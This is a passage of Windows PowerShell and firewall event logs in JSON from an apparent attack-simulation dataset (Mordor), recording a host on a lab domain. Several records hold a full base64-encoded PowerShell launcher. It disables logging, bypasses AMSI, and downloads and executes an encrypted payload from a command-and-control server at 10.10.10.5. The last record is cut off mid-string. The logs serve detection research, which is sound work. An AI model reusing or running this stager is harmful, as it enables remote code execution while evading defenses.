{"Task":106,"EventReceivedTime":"2020-07-22 00:19:00","Opcode":"To be used when operation is just executing a method","port":55069,"SeverityValue":2,"ActivityID":"{17E565D6-3A73-0000-E2BB-DC81FF5DD601}","Keywords":0,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","@version":"1","SourceModuleType":"im_msvistalog","Version":1,"Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$a9486.Headers.Add($_.Name, $_.Value)\"\r\n","tags":["mordorDataset"],"Domain":"MORDOR","SourceName":"Microsoft-Windows-PowerShell","UserID":"S-1-5-21-2253742117-2054739524-205962475-1104","Channel":"Microsoft-Windows-PowerShell/Operational","SourceModuleName":"eventlog","Message":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$a9486.Headers.Add($_.Name, $_.Value)\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = ForEach-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11287\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 78f49efe-32de-4c99-80f6-3f5158742484\r\n        Pipeline ID = 1\r\n        Command Name = ForEach-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 11287\r\n        User = MORDOR\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Category":"Executing Pipeline","@timestamp":"2020-07-22T04:19:00.084Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","AccountType":"User","AccountName":"pgustavo","ExecutionProcessID":9076,"EventType":"INFO","OpcodeValue":20,"EventTime":"2020-07-22 00:18:58","Severity":"INFO","EventID":4103,"ThreadID":5048,"RecordNumber":8727}
{"Task":12810,"Direction":"%%14593","Opcode":"Info","SourcePort":"51072","FilterRTID":"71481","LayerName":"%%14611","EventReceivedTime":"2020-07-22 00:19:00","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.39.5","ProcessId":"9076","DestAddress":"10.10.10.5","Protocol":"6","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t9076\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.39.5\r\n\tSource Port:\t\t51072\r\n\tDestination Address:\t10.10.10.5\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t71481\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:19:00.084Z","LayerRTID":"48","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:58","Severity":"INFO","EventID":5156,"DestPort":"80","ThreadID":7184,"RecordNumber":258656}
{"Task":106,"EventReceivedTime":"2020-07-22 00:19:01","Opcode":"To be used when operation is just executing a method","port":55069,"SeverityValue":2,"ActivityID":"{17E565D6-3A73-0000-E3BB-DC81FF5DD601}","Keywords":0,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","@version":"1","SourceModuleType":"im_msvistalog","Version":1,"Payload":"CommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n","tags":["mordorDataset"],"Domain":"MORDOR","SourceName":"Microsoft-Windows-PowerShell","UserID":"S-1-5-21-2253742117-2054739524-205962475-1104","Channel":"Microsoft-Windows-PowerShell/Operational","SourceModuleName":"eventlog","Message":"CommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQ